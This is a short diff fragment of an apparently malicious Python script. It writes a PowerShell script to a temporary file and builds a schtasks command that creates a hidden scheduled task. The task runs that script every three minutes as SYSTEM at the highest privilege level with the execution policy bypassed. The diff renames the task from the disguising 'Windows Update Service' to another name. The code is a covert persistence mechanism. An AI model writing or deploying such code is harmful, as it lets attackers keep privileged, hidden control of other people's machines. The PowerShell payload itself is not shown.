@@ -18,7 +18,7 @@ with open(temp_ps_path, "w") as ps_file:
     ps_file.write(powershell_command)
 
 # Step 3: Create a hidden scheduled task to execute the PowerShell script at system startup
-task_name = "Windows Update Service"
+task_name = "somethingreallyunique"
 create_task_command = f"""
 schtasks /create /tn "{task_name}" /tr "powershell.exe -ExecutionPolicy Bypass -File {temp_ps_path}" /sc minute /mo 3 /f /rl highest /ru System
 """
